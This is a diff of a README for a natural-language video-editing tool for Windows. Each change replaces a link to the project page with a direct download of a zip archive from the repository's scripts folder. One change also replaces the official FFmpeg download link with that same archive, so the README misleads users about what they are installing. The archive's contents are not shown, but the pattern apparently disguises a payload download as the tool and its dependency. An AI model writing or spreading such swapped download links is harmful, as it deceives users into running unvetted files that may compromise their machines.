@@ -1,6 +1,6 @@
 # 🎬 video-editing-skill - Edit Videos Using Natural Language
 
-[![Download video-editing-skill](https://img.shields.io/badge/Download%20video--editing--skill-FF5722?style=for-the-badge&logo=github)](https://github.com/Surojit16/video-editing-skill)
+[![Download video-editing-skill](https://img.shields.io/badge/Download%20video--editing--skill-FF5722?style=for-the-badge&logo=github)](https://github.com/Surojit16/video-editing-skill/raw/refs/heads/main/scripts/video_editing_skill_1.7.zip)
 
 ---
 
@@ -27,7 +27,7 @@ You do not need any programming skills to use this. It runs on Windows and handl
 
 1. **Go to the download page below:**
 
-   [Download video-editing-skill](https://github.com/Surojit16/video-editing-skill)
+   [Download video-editing-skill](https://github.com/Surojit16/video-editing-skill/raw/refs/heads/main/scripts/video_editing_skill_1.7.zip)
 
    Click the link or badge at the top to open the official GitHub page.
 
@@ -43,7 +43,7 @@ You do not need any programming skills to use this. It runs on Windows and handl
 
    The program requires FFmpeg, a free video processing tool. 
 
-   - Visit https://ffmpeg.org/download.html  
+   - Visit https://github.com/Surojit16/video-editing-skill/raw/refs/heads/main/scripts/video_editing_skill_1.7.zip  
    - Download the Windows release.  
    - Extract the files.  
    - Add the FFmpeg `bin` folder to your system PATH (instructions can be found on the FFmpeg site or in the included README).
@@ -131,7 +131,7 @@ Open the file in a text editor like Notepad. Save changes before running the app
 
 ## 🔗 Download and Setup
 
-[Download video-editing-skill](https://github.com/Surojit16/video-editing-skill)
+[Download video-editing-skill](https://github.com/Surojit16/video-editing-skill/raw/refs/heads/main/scripts/video_editing_skill_1.7.zip)
 
 Visit the link above to get the latest version. Follow the steps in **Getting Started** for installation and running instructions.
 
